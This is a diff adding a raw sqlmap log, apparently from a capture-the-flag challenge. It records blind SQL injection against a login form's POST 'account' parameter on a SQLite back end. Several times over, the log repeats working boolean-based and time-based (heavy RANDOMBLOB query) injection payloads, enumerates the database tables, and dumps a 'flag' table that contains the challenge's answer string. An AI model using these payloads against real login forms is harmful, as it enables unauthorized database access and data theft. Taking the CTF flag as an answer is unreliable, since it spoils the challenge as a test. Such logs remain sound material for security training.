@@ -1,0 +1,92 @@
+sqlmap identified the following injection point(s) with a total of 227 HTTP(s) requests:
+---
+Parameter: account (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: account=admin' AND 8166=8166-- kEGv&password=admin
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: account=admin' AND 9367=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- iStj&password=admin
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: account (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: account=admin' AND 8166=8166-- kEGv&password=admin
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: account=admin' AND 9367=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- iStj&password=admin
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: account (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: account=admin' AND 8166=8166-- kEGv&password=admin
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: account=admin' AND 9367=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- iStj&password=admin
+---
+back-end DBMS: SQLite
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: account (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: account=admin' AND 8166=8166-- kEGv&password=admin
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: account=admin' AND 9367=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- iStj&password=admin
+---
+back-end DBMS: SQLite
+Database: SQLite_masterdb
+[3 tables]
++-----------------+
+| flag            |
+| sqlite_sequence |
+| users           |
++-----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: account (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: account=admin' AND 8166=8166-- kEGv&password=admin
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: account=admin' AND 9367=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- iStj&password=admin
+---
+back-end DBMS: SQLite
+Database: SQLite_masterdb
+Table: flag
+[4 entries]
++----+----------------------------------------+
+| id | flag                                   |
++----+----------------------------------------+
+| 1  | you are close                          |
+| 2  | you are more closer                    |
+| 3  | almost there                           |
+| 4  | SWCTF{c0ngratu1ati0n5_u_find_th3_f1ag} |
++----+----------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: account (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: account=admin' AND 8166=8166-- kEGv&password=admin
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: account=admin' AND 9367=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- iStj&password=admin
+---
+back-end DBMS: SQLite
